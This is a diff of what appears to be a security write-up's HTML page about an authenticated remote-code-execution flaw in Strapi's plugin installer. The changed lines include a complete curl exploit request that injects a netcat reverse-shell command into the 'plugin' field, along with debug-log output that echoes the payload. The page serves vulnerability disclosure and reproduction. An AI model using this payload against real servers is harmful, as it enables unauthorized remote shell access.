@@ -56,7 +56,7 @@ Description:
 
 <meta itemprop="datePublished" content="2019-12-03T15:33:07&#43;00:00" />
 <meta itemprop="dateModified" content="2019-12-03T15:33:07&#43;00:00" />
-<meta itemprop="wordCount" content="414">
+<meta itemprop="wordCount" content="445">
 
 
 
@@ -217,16 +217,16 @@ Description:
 
 <p>This payload should create a <code>/tmp/whoami</code> file on the target system.</p>
 
-<p>To reproduce this issue, using <code>strapi-3.0.0-beta.17.7</code>.</p>
+<p>To reproduce this issue the app must be using <code>strapi-3.0.0-beta.17.7</code> or earlier. This is an authenticated RCE, so we would need a valid JWT with access to install and uninstall plugins.</p>
 
-<p>Once the admin account is created, grab the JWT and update the <code>Authorization</code> header:</p>
+<p>With a valid <code>JWT</code>, we can issue this <code>curl</code> command to execute a reverse shell payload on the server:</p>
 
 <pre><code class="language-c">curl -i -s -k -X $'POST' -H $'Host: localhost:1337' -H $'Authorization: Bearer [jwt]' -H $'Content-Type: application/json' -H $'Origin: http://localhost:1337' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\&quot;plugin\&quot;:\&quot;documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f)\&quot;,\&quot;port\&quot;:\&quot;1337\&quot;}' $'http://localhost:1337/admin/plugins/install'
 </code></pre>
 
-<p>The server debug log will confirm the input was not sanitized:</p>
+<p>The strapi server debug log will confirm the input was not sanitized:</p>
 
-<pre><code class="language-log">[] info Installing documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f)...
+<pre><code>[] info Installing documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f)...
 [] Error: Command failed: npm run strapi -- install documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f)
 </code></pre>
 
